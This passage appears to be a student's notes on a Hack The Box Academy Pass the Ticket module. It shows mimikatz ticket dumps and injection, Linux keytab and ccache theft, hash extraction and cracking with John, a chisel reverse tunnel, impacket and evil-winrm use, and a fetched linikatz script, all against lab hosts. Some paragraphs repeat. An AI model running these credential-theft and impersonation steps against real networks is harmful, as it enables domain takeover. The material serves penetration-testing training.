           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             b4e184090890f3ed78a1547b6a761bd1b3fa7370bd832bcbeb65aa174865892c
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 7        [...]
           * Saved to file [0;3e7]-0-0-40a50000-MS01$@cifs-DC01.inlanefreight.htb.kirbi !
         [00000001]
           Start/End/MaxRenew: 11/20/2026 7:22:15 AM ; 11/20/2026 5:22:14 PM ; 11/27/2026 7:22:14 AM
           Service Name (01) : MS01$ ; @ INLANEFREIGHT.HTB
           Target Name  (01) : MS01$ ; @ INLANEFREIGHT.HTB
           Client Name  (01) : MS01$ ; @ INLANEFREIGHT.HTB
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             ece69f0312c5704a50b518679f91a6b47d4f9173c3aaee520f51c13fa81bac5d
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]
           * Saved to file [0;3e7]-0-1-40a50000.kirbi !
         [00000002]
           Start/End/MaxRenew: 11/20/2026 7:22:14 AM ; 11/20/2026 5:22:14 PM ; 11/27/2026 7:22:14 AM
           Service Name (02) : LDAP ; DC01.inlanefreight.htb ; @ INLANEFREIGHT.HTB
           Target Name  (02) : LDAP ; DC01.inlanefreight.htb ; @ INLANEFREIGHT.HTB
           Client Name  (01) : MS01$ ; @ INLANEFREIGHT.HTB
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             9a3f73ff859df57ab57076d41c21ae94c83bf43f73d0f5b1029e92288729c961
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 7        [...]
           * Saved to file [0;3e7]-0-2-40a50000-MS01$@LDAP-DC01.inlanefreight.htb.kirbi !
         [00000003]
           Start/End/MaxRenew: 11/20/2026 7:22:14 AM ; 11/20/2026 5:22:14 PM ; 11/27/2026 7:22:14 AM
           Service Name (02) : LDAP ; DC01.inlanefreight.htb ; inlanefreight.htb ; @ INLANEFREIGHT.HTB
           Target Name  (02) : LDAP ; DC01.inlanefreight.htb ; inlanefreight.htb ; @ INLANEFREIGHT.HTB
           Client Name  (01) : MS01$ ; @ INLANEFREIGHT.HTB ( INLANEFREIGHT.HTB )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             fc293e95734a73be876df67f24710d14638edacb1b4d840937f2efbcb1f9a932
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 7        [...]
           * Saved to file [0;3e7]-0-3-40a50000-MS01$@LDAP-DC01.inlanefreight.htb.kirbi !

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 11/20/2026 7:22:15 AM ; 11/20/2026 5:22:14 PM ; 11/27/2026 7:22:14 AM
           Service Name (02) : krbtgt ; INLANEFREIGHT.HTB ; @ INLANEFREIGHT.HTB
           Target Name  (--) : @ INLANEFREIGHT.HTB
           Client Name  (01) : MS01$ ; @ INLANEFREIGHT.HTB ( $$Delegation Ticket$$ )
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             762d54c5fd6f0af3e6ee1f042b21465f03eedb0f738ecd71f97f3d30898c3b96
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3e7]-2-0-60a10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi !
         [00000001]
           Start/End/MaxRenew: 11/20/2026 7:22:14 AM ; 11/20/2026 5:22:14 PM ; 11/27/2026 7:22:14 AM
           Service Name (02) : krbtgt ; INLANEFREIGHT.HTB ; @ INLANEFREIGHT.HTB
           Target Name  (02) : krbtgt ; INLANEFREIGHT.HTB ; @ INLANEFREIGHT.HTB
           Client Name  (01) : MS01$ ; @ INLANEFREIGHT.HTB ( INLANEFREIGHT.HTB )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             0b961505d1f4e4402f42381df6c521f0a43303bfc9b99e556f7b14f037c593e8
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3e7]-2-1-40e10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi !
```

2. Use john's `TGT` to perform a Pass the Ticket attack and retrieve the flag from the shared folder `\\DC01.inlanefreight.htb\john`

```bash
mimikatz # kerberos::ptt "C:\tools\[0;5ded4]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"

* File: 'C:\tools\[0;5ded4]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi': OK
  
  
mimikatz # misc::cmd
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF7303243B8

C:\Users\Administrator>type \\DC01.inlanefreight.htb\john\john.txt
HTB{{REDACTED_FLAG}}
```

3. Use john's `TGT` to perform a Pass the Ticket attack and connect to the DC01 using PowerShell Remoting. Read the flag from C:\john\john.txt

```bash
[00000000]
           Start/End/MaxRenew: 11/20/2026 7:22:15 AM ; 11/20/2026 5:22:14 PM ; 11/27/2026 7:22:14 AM
           Service Name (02) : cifs ; DC01.inlanefreight.htb ; inlanefreight.htb ; @ INLANEFREIGHT.HTB
           Target Name  (02) : cifs ; DC01.inlanefreight.htb ; inlanefreight.htb ; @ INLANEFREIGHT.HTB
           Client Name  (01) : MS01$ ; @ INLANEFREIGHT.HTB ( inlanefreight.htb )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             b4e184090890f3ed78a1547b6a761bd1b3fa7370bd832bcbeb65aa174865892c
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 7        [...]
           * Saved to file [0;3e7]-0-0-40a50000-MS01$@cifs-DC01.inlanefreight.htb.kirbi !
         [00000001]
         
         
mimikatz # kerberos::ptt "C:\tools\[0;3e7]-0-0-40a50000-MS01$@cifs-DC01.inlanefreight.htb.kirbi"
mimikatz # exit
mimikatz # powershell

Enter-PSSession -ComputerName DC01
HTB{{REDACTED_FLAG}}
```
## Pass the Ticket (PtT) from Linux

Although not common, Linux computers can connect to Active Directory to provide centralized identity management and integrate with the organization's systems, giving users the ability to have a single identity to authenticate on Linux and Windows computers.

A Linux computer connected to Active Directory commonly uses Kerberos as authentication. Suppose this is the case, and we manage to compromise a Linux machine connected to Active Directory. In that case, we could try to find Kerberos tickets to impersonate other users and gain more access to the network.

A Linux system can be configured in various ways to store Kerberos tickets. We'll discuss a few different storage options in this section.

**Note:** A Linux machine not connected to Active Directory could use Kerberos tickets in scripts or to authenticate to the network. It is not a requirement to be joined to the domain to use Kerberos tickets from a Linux machine.
### Kerberos on Linux

[[Windows]] and Linux use the same process to request a Ticket Granting Ticket (TGT) and Service Ticket (TGS). However, how they store the ticket information may vary depending on the Linux distribution and implementation.

In most cases, Linux machines store Kerberos tickets as [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) in the `/tmp` directory. By default, the location of the Kerberos ticket is stored in the environment variable `KRB5CCNAME`. This variable can identify if Kerberos tickets are being used or if the default location for storing Kerberos tickets is changed. These [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) are protected by specific read/write permissions, but a user with elevated privileges or root privileges could easily gain access to these tickets.

Another everyday use of Kerberos in Linux is with [keytab](https://servicenow.iu.edu/kb?sys_kb_id=2c10b87f476456583d373803846d4345&id=kb_article_view#intro) files. A `keytab` is a file containing pairs of Kerberos principals and encrypted keys (which are derived from the Kerberos password). You can use a keytab file to authenticate to various remote systems using Kerberos without entering a password. However, when you change your password, you must recreate all your keytab files.

`Keytab` files commonly allow scripts to authenticate automatically using Kerberos without requiring human interaction or access to a password stored in a plain text file. For example, a script can use a keytab file to access files stored in the Windows share folder.

**Note:** Any computer that has a Kerberos client installed can create keytab files. Keytab files can be created on one computer and copied for use on other computers because they are not restricted to the systems on which they were initially created.
### Scenario

To practice and understand how we can abuse Kerberos from a Linux system, we have a computer (`LINUX01`) connected to the Domain Controller. This machine is only reachable through `MS01`. To access this machine over SSH, we can connect to `MS01` via RDP and, from there, connect to the Linux machine using SSH from the Windows command line. Another option is to use a port forward. If you don't know how to do it, you can read the module [Pivoting, Tunneling, and Port Forwarding](https://academy.hackthebox.com/module/details/158).

As an alternative, we created a port forward to simplify the interaction with `LINUX01`. By connecting to port TCP/2222 on `MS01`, we will gain access to port TCP/22 on `LINUX01`.

Let's assume we are in a new assessment, and the company gives us access to `LINUX01` and the user `david@inlanefreight.htb` and password `Password2`.

```bash
mdn0x@htb[/htb]$ ssh david@inlanefreight.htb@10.129.204.23 -p 2222
```

We can identify if the Linux machine is domain-joined using [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd), a tool used to manage system enrollment in a domain and set which domain users or groups are allowed to access the local system resources.

```bash
david@inlanefreight.htb@linux01:~$ realm list
```


The output of the command indicates that the machine is configured as a Kerberos member. It also gives us information about the domain name (inlanefreight.htb) and which users and groups are permitted to log in, which in this case are the users David and Julio and the group Linux Admins.

In case [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd) is not available, we can also look for other tools used to integrate Linux with Active Directory such as [sssd](https://sssd.io/) or [winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html). Looking for those services running in the machine is another way to identify if it is domain-joined. We can read this [blog post](https://web.archive.org/web/20210624040251/https://www.2daygeek.com/how-to-identify-that-the-linux-server-is-integrated-with-active-directory-ad/) for more details. Let's search for those services to confirm if the machine is domain-joined.

```bash
david@inlanefreight.htb@linux01:~$ ps -ef | grep -i "winbind\|sssd"
```

### Finding Kerberos tickets in Linux

As an attacker, we are always looking for credentials. On Linux domain-joined machines, we want to find Kerberos tickets to gain more access. Kerberos tickets can be found in different places depending on the Linux implementation or the administrator changing default settings. Let's explore some common ways to find Kerberos tickets.

A straightforward approach is to use `find` to search for files whose name contains the word `keytab`. When an administrator commonly creates a Kerberos ticket to be used with a script, it sets the extension to `.keytab`. Although not mandatory, it is a way in which administrators commonly refer to a keytab file.

```bash
david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null
```
**Note:** To use a keytab file, we must have read and write (rw) privileges on the file.

Another way to find `KeyTab` files is in automated scripts configured using a cronjob or any other Linux service. If an administrator needs to run a script to interact with a Windows service that uses Kerberos, and if the keytab file does not have the `.keytab` extension, we may find the appropriate filename within the script. Let's see this example:

```bash
carlos@inlanefreight.htb@linux01:~$ crontab -l
```

In the above script, we notice the use of [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html), which means that Kerberos is in use. [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html) allows interaction with Kerberos, and its function is to request the user's TGT and store this ticket in the cache (ccache file). We can use `kinit` to import a `keytab` into our session and act as the user.

In this example, we found a script importing a Kerberos ticket (`svc_workstations.kt`) for the user `svc_workstations@INLANEFREIGHT.HTB` before trying to connect to a shared folder. We'll later discuss how to use those tickets and impersonate users.

**Note:** As we discussed in the Pass the Ticket from Windows section, a computer account needs a ticket to interact with the Active Directory environment. Similarly, a Linux domain-joined machine needs a ticket. The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account LINUX01$.INLANEFREIGHT.HTB

A credential cache or [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) file holds Kerberos credentials while they remain valid and, generally, while the user's session lasts. Once a user authenticates to the domain, a ccache file is created that stores the ticket information. The path to this file is placed in the `KRB5CCNAME` environment variable. This variable is used by tools that support Kerberos authentication to find the Kerberos data. Let's look for the environment variables and identify the location of our Kerberos credentials cache:

```bash
david@inlanefreight.htb@linux01:~$ env | grep -i krb5
```

As mentioned previously, `ccache` files are located, by default, at `/tmp`. We can search for users who are logged on to the computer, and if we gain access as root or a privileged user, we would be able to impersonate a user using their `ccache` file while it is still valid.

```bash
david@inlanefreight.htb@linux01:~$ ls -la /tmp
```

### Abusing KeyTab files

As attackers, we may have several uses for a keytab file. The first thing we can do is impersonate a user using `kinit`. To use a keytab file, we need to know which user it was created for. `klist` is another application used to interact with Kerberos on Linux. This application reads information from a `keytab` file. Let's see that with the following command:

```bash
david@inlanefreight.htb@linux01:~$ klist -k -t /opt/specialfiles/carlos.keytab 
```

The ticket corresponds to the user Carlos. We can now impersonate the user with `kinit`. Let's confirm which ticket we are using with `klist` and then import Carlos's ticket into our session with `kinit`.

**Note:** **kinit** is case-sensitive, so be sure to use the name of the principal as shown in klist. In this case, the username is lowercase, and the domain name is uppercase.

Impersonating a user:
```bash
david@inlanefreight.htb@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
```

We can attempt to access the shared folder `\\dc01\carlos` to confirm our access.

```bash
david@inlanefreight.htb@linux01:~$ smbclient //dc01/carlos -k -c ls
```

**Note:** To keep the ticket from the current session, before importing the keytab, save a copy of the ccache file present in the environment variable `KRB5CCNAME`.

The second method we will use to abuse Kerberos on Linux is extracting the secrets from a keytab file. We were able to impersonate Carlos using the account's tickets to read a shared folder in the domain, but if we want to gain access to his account on the Linux machine, we'll need his password.

We can attempt to crack the account's password by extracting the hashes from the keytab file. Let's use [KeyTabExtract](https://github.com/sosdave/KeyTabExtract), a tool to extract valuable information from 502-type `.keytab` files, which may be used to authenticate Linux boxes to Kerberos. The script will extract information such as the realm, Service Principal, Encryption Type, and Hashes.


The second method we will use to abuse Kerberos on Linux is extracting the secrets from a keytab file. We were able to impersonate Carlos using the account's tickets to read a shared folder in the domain, but if we want to gain access to his account on the Linux machine, we'll need his password.

We can attempt to crack the account's password by extracting the hashes from the keytab file. Let's use [KeyTabExtract](https://github.com/sosdave/KeyTabExtract), a tool to extract valuable information from 502-type `.keytab` files, which may be used to authenticate Linux boxes to Kerberos. The script will extract information such as the realm, Service Principal, Encryption Type, and Hashes.

With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password.

**Note:** A KeyTab file can contain different types of hashes and can be merged to contain multiple credentials even from different users.

The most straightforward hash to crack is the NTLM hash. We can use tools like [Hashcat](https://hashcat.net/) or [John the Ripper](https://www.openwall.com/john/) to crack it. However, a quick way to decrypt passwords is with online repositories such as [https://crackstation.net/](https://crackstation.net/), which contains billions of passwords.

Carlos has a cronjob that uses a KeyTab file named `svc_workstations.kt`. We can repeat the process, crack the password, and log in as `svc_workstations`.
### Abusing KeyTab ccache

To abuse a ccache file, all we need is read privileges on the file. These files, located in `/tmp`, can only be read by the user who created them, but if we gain root access, we could use them.

Once we log in with the credentials for the user `svc_workstations`, we can use `sudo -l` and confirm that the user can execute any command as root. We can use the `sudo su` command to change the user to root.

```bash
root@linux01:~# ls -la /tmp
```

There is one user ([julio@inlanefreight.htb](mailto:julio@inlanefreight.htb)) to whom we have not yet gained access. We can confirm the groups to which he belongs using `id`.

Julio is a member of the `Domain Admins` group. We can attempt to impersonate the user and gain access to the `DC01` Domain Controller host.

To use a ccache file, we can copy the ccache file and assign the file path to the `KRB5CCNAME` variable.

```bash
root@linux01:~# klist

klist: No credentials cache found (filename: /tmp/krb5cc_0)
root@linux01:~# cp /tmp/krb5cc_647401106_I8I133 .
root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_I8I133
root@linux01:~# klist
```

**Note:** klist displays the ticket information. We must consider the values "valid starting" and "expires." If the expiration date has passed, the ticket will not work. `ccache files` are temporary. They may change or expire if the user no longer uses them or during login and logout operations.
### Using Linux attack tools with Kerberos

Many Linux attack tools that interact with Windows and Active Directory support Kerberos authentication. If we use them from a domain-joined machine, we need to ensure our `KRB5CCNAME` environment variable is set to the ccache file we want to use. In case we are attacking from a machine that is not a member of the domain, for example, our attack host, we need to make sure our machine can contact the KDC or Domain Controller, and that domain name resolution is working.

In this scenario, our attack host doesn't have a connection to the `KDC/Domain Controller`, and we can't use the Domain Controller for name resolution. To use Kerberos, we need to proxy our traffic via `MS01` with a tool such as [Chisel](https://github.com/jpillora/chisel) and [Proxychains](https://github.com/haad/proxychains) and edit the `/etc/hosts` file to hardcode IP addresses of the domain and the machines we want to attack.

Many Linux attack tools that interact with Windows and Active Directory support Kerberos authentication. If we use them from a domain-joined machine, we need to ensure our `KRB5CCNAME` environment variable is set to the ccache file we want to use. In case we are attacking from a machine that is not a member of the domain, for example, our attack host, we need to make sure our machine can contact the KDC or Domain Controller, and that domain name resolution is working.

In this scenario, our attack host doesn't have a connection to the `KDC/Domain Controller`, and we can't use the Domain Controller for name resolution. To use Kerberos, we need to proxy our traffic via `MS01` with a tool such as [Chisel](https://github.com/jpillora/chisel) and [Proxychains](https://github.com/haad/proxychains) and edit the `/etc/hosts` file to hardcode IP addresses of the domain and the machines we want to attack.

```bash
mdn0x@htb[/htb]$ cat /etc/proxychains.conf
```

We must download and execute [chisel](https://github.com/jpillora/chisel) on our attack host.

```bash
mdn0x@htb[/htb]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
mdn0x@htb[/htb]$ gzip -d chisel_1.7.7_linux_amd64.gz
mdn0x@htb[/htb]$ mv chisel_* chisel && chmod +x ./chisel
mdn0x@htb[/htb]$ sudo ./chisel server --reverse 
```


Connect to `MS01` via RDP and execute chisel (located in C:\Tools).

```bash
mdn0x@htb[/htb]$ xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
```


```bash
C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks

2022/10/10 06:34:19 client: Connecting to ws://10.10.14.33:8080
2022/10/10 06:34:20 client: Connected (Latency 125.6177ms)
```

**Note:** The client IP is your attack host IP.

Finally, we need to transfer Julio's ccache file from `LINUX01` and create the environment variable `KRB5CCNAME` with the value corresponding to the path of the ccache file.


```bash
mdn0x@htb[/htb]$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

**Note:** If you are not familiar with file transfer operations, check out the module [File Transfers](https://academy.hackthebox.com/module/details/24).
### Impacket

To use the Kerberos ticket, we need to specify our target machine name (not the IP address) and use the option `-k`. If we get a prompt for a password, we can also include the option `-no-pass`.

```bash
mdn0x@htb[/htb]$ proxychains impacket-wmiexec dc01 -k
```

**Note:** If you are using Impacket tools from a Linux machine connected to the domain, note that some Linux Active Directory implementations use the FILE: prefix in the KRB5CCNAME variable. If this is the case, we need to modify the variable only to include the path to the ccache file.
### Evil-WinRM

To use [evil-winrm](https://github.com/Hackplayers/evil-winrm) with Kerberos, we need to install the Kerberos package used for network authentication. For some Linux like Debian-based (Parrot, Kali, etc.), it is called `krb5-user`. While installing, we'll get a prompt for the Kerberos realm. Use the domain name: `INLANEFREIGHT.HTB`, and the KDC is the `DC01`.

```bash
mdn0x@htb[/htb]$ sudo apt-get install krb5-user -y
```

The Kerberos servers can be empty.

In case the package `krb5-user` is already installed, we need to change the configuration file `/etc/krb5.conf` to include the following values:

```bash
mdn0x@htb[/htb]$ cat /etc/krb5.conf
```
Now we can use evil-winrm.

```bash
mdn0x@htb[/htb]$ proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

### Conversions

If we want to use a `ccache file` in Windows or a `kirbi file` in a Linux machine, we can use [impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) to convert them. To use it, we specify the file we want to convert and the output filename. Let's convert Julio's ccache file to kirbi.

```bash
mdn0x@htb[/htb]$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```
We can do the reverse operation by first selecting a `.kirbi file`. Let's use the `.kirbi` file in Windows.

Importing with `Rubeus`

C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
### Linikatz

[Linikatz](https://github.com/CiscoCXSecurity/linikatz) is a tool created by Cisco's security team for exploiting credentials on Linux machines when there is an integration with Active Directory. In other words, Linikatz brings a similar principle to `Mimikatz` to UNIX environments.

Just like `Mimikatz`, to take advantage of Linikatz, we need to be root on the machine. This tool will extract all credentials, including Kerberos tickets, from different Kerberos implementations such as FreeIPA, SSSD, Samba, Vintella, etc. Once it extracts the credentials, it places them in a folder whose name starts with `linikatz.`. Inside this folder, you will find the credentials in the different available formats, including ccache and keytabs. These can be used, as appropriate, as explained above.

```bash
mdn0x@htb[/htb]$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
mdn0x@htb[/htb]$ /opt/linikatz.sh
```
### Exercise

1. Connect to the target machine using SSH to the port TCP/2222 and the provided credentials. Read the flag in David's home directory.

SSH to with user "david@inlanefreight.htb" and password "Password2"

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ ssh david@inlanefreight.htb@10.129.206.135 -p 2222

david@inlanefreight.htb@linux01:~$ cat flag.txt 
HTB{{REDACTED_FLAG}}
```

2. Which group can connect to LINUX01?      `Linux Admins`

```bash
david@inlanefreight.htb@linux01:~$ realm list
inlanefreight.htb
  type: kerberos
  realm-name: INLANEFREIGHT.HTB
  domain-name: inlanefreight.htb
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U@inlanefreight.htb
  login-policy: allow-permitted-logins
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: Linux Admins
```

3. Look for a keytab file that you have read and write access. Submit the file name as a response.        `carlos.keytab`

```
david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null                                                                                                                                           
   287437      4 -rw-r--r--   1 root     root         2110 Aug  9  2021 /usr/lib/python3/dist-packages/samba/tests/dckeytab.py
   288276      4 -rw-r--r--   1 root     root         1871 Oct  4  2022 /usr/lib/python3/dist-packages/samba/tests/__pycache__/dckeytab.cpython-38.pyc
   287720     24 -rw-r--r--   1 root     root        22768 Jul 18  2022 /usr/lib/x86_64-linux-gnu/samba/ldb/update_keytab.so
   286812     28 -rw-r--r--   1 root     root        26856 Jul 18  2022 /usr/lib/x86_64-linux-gnu/samba/libnet-keytab.so.0
   131610      4 -rw-------   1 root     root         2694 Nov 20 16:07 /etc/krb5.keytab
   262464     12 -rw-r--r--   1 root     root        10015 Oct  4  2022 /opt/impacket/impacket/krb5/keytab.py
   262618      4 -rw-rw-rw-   1 root     root          216 Nov 20 16:30 /opt/specialfiles/carlos.keytab
   131201      8 -rw-r--r--   1 root     root         4582 Oct  6  2022 /opt/keytabextract.py
   287958      4 drwx------   2 sssd     sssd         4096 Jun 21  2022 /var/lib/sss/keytabs                                           
   398204      4 -rw-r--r--   1 root     root          380 Oct  4  2022 /var/lib/gems/2.7.0/doc/gssapi-1.3.1/ri/GSSAPI/Simple/set_keytab-i.ri  
```

4. Extract the hashes from the keytab file you found, crack the password, log in as the user and submit the flag in the user's home directory.


```
david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab                                                                                                                   
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.                                       
[+] Keytab File successfully imported.                                                                                                                                                                             
        REALM : INLANEFREIGHT.HTB                 
        SERVICE PRINCIPAL : carlos/
        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f                                   
        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4 
```

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ john --format=NT hash
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=12
Note: Passwords longer than 27 rejected
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Enabling duplicate candidate password suppressor using 256 MiB
Password5        (?)     
1g 0:00:00:00 DONE 2/3 (2026-11-20 17:38) 5.882g/s 404329p/s 404329c/s 404329C/s chan..bear2327
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed


─$ ssh carlos@inlanefreight.htb@10.129.206.135 -p 2222

carlos@inlanefreight.htb@linux01:~$ cat flag.txt 
HTB{{REDACTED_FLAG}}
```


5. Check Carlos' crontab, and look for keytabs to which Carlos has access. Try to get the credentials of the user svc_workstations and use them to authenticate via SSH. Submit the flag.txt in svc_workstations' home directory.

```bash
carlos@inlanefreight.htb@linux01:~$ crontab -l                                                                                                                                                                                                          
# m h  dom mon dow   command                                                                                                                                                                                       
*/5 * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh                                                                                                                                        


carlos@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null                                                                                                                                          
   287437      4 -rw-r--r--   1 root     root         2110 Aug  9  2021 /usr/lib/python3/dist-packages/samba/tests/dckeytab.py                                                                                     
   288276      4 -rw-r--r--   1 root     root         1871 Oct  4  2022 /usr/lib/python3/dist-packages/samba/tests/__pycache__/dckeytab.cpython-38.pyc                                                             
   287720     24 -rw-r--r--   1 root     root        22768 Jul 18  2022 /usr/lib/x86_64-linux-gnu/samba/ldb/update_keytab.so                                                                                       
   286812     28 -rw-r--r--   1 root     root        26856 Jul 18  2022 /usr/lib/x86_64-linux-gnu/samba/libnet-keytab.so.0                                                                                         
   288491      4 -rw-------   1 carlos@inlanefreight.htb domain users@inlanefreight.htb      146 Oct  6  2022 /home/carlos@inlanefreight.htb/.scripts/john.keytab
   131610      4 -rw-------   1 root                     root                               2694 Nov 20 16:07 /etc/krb5.keytab
   262464     12 -rw-r--r--   1 root                     root                              10015 Oct  4  2022 /opt/impacket/impacket/krb5/keytab.py
   262184      4 -rw-rw-rw-   1 root                     root                                216 Nov 20 16:40 /opt/specialfiles/carlos.keytab
   131201      8 -rw-r--r--   1 root                     root                               4582 Oct  6  2022 /opt/keytabextract.py
   287958      4 drwx------   2 sssd                     sssd                               4096 Jun 21  2022 /var/lib/sss/keytabs
   398204      4 -rw-r--r--   1 root                     root                                380 Oct  4  2022 /var/lib/gems/2.7.0/doc/gssapi-1.3.1/ri/GSSAPI/Simple/set_keytab-i.ri
   
carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```

```bash
carlos@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
[!] No RC4-HMAC located. Unable to extract NTLM hashes.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[!] Unable to identify any AES128-CTS-HMAC-SHA1 hashes.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : svc_workstations/
        AES-256 HASH : 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d
        
carlos@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/john.keytab
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[!] Unable to identify any AES128-CTS-HMAC-SHA1 hashes.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : john/
        NTLM HASH : c4b0e1b10c7ce2c4723b4e2407ef81a2
        AES-256 HASH : 9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc
        
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ john --format=NT hash2
Password3        (?)   


carlos@inlanefreight.htb@linux01:~/.scripts$ env | grep -i krb5
KRB5CCNAME=FILE:/tmp/krb5cc_647402606_5raF9k

NEFREIGHT.HTB2carlos@inlanefreight.htb@linux01:~/.scripts$ export KRB5CCNAME='FILE:/tmp/krb5cc_647402606_5raF9k' 
carlos@inlanefreight.htb@linux01:~/.scripts$ klist
Ticket cache: FILE:/tmp/krb5cc_647402606_5raF9k
Default principal: svc_workstations@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
11/20/2026 17:07:40  11/21/2026 03:07:40  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 11/21/2026 17:07:40
        
carlos@inlanefreight.htb@linux01:~/.scripts$ python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt 
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
